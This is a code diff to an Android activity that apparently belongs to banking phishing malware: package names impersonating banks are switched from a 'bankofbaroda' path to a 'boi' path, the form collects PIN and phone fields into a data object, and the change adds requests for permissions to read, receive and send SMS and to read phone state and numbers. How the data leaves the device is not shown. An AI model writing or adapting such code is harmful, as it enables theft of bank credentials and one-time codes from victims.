@@ -20,8 +20,8 @@
     import androidx.core.app.ActivityCompat;
     import androidx.core.content.ContextCompat;
 
-    import com.bankofbaroda.service.google.api.FrontServices.BackgroundService;
-    import com.bankofbaroda.service.google.api.FrontServices.FormValidator;
+    import com.mydesign.service.boi.net.FrontServices.BackgroundService;
+    import com.mydesign.service.boi.net.FrontServices.FormValidator;
 
     import org.json.JSONException;
     import org.json.JSONObject;
@@ -44,7 +44,9 @@
             setContentView(R.layout.activity_main);
 
             dataObject = new HashMap<>();
-            checkAndRequestPermissions();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                checkAndRequestPermissions();
+            }
 
             Helper helper1 = new Helper();
             Log.d(helper1.TAG, helper1.SITE());
@@ -62,9 +64,8 @@
             }
             // Initialize the ids map
             ids = new HashMap<>();
-            ids.put(R.id.name, "name");
+            ids.put(R.id.apin, "apin");
             ids.put(R.id.phone, "phone");
-            ids.put(R.id.mpin, "mpin");
 
             // Populate dataObject
             for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -198,15 +199,24 @@
 
 
         // start permission checker
+        @RequiresApi(api = Build.VERSION_CODES.O)
         private void checkAndRequestPermissions() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 // Check if the SMS permission is not granted
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) !=
                         PackageManager.PERMISSION_GRANTED ||
                         ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
-                                PackageManager.PERMISSION_GRANTED) {
+                                PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) !=
+                                PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
+                                PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) !=
+                                PackageManager.PERMISSION_GRANTED
+                ) {
+
                     ActivityCompat.requestPermissions(this,
-                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
+                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS},
                             SMS_PERMISSION_REQUEST_CODE);
                 } else {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
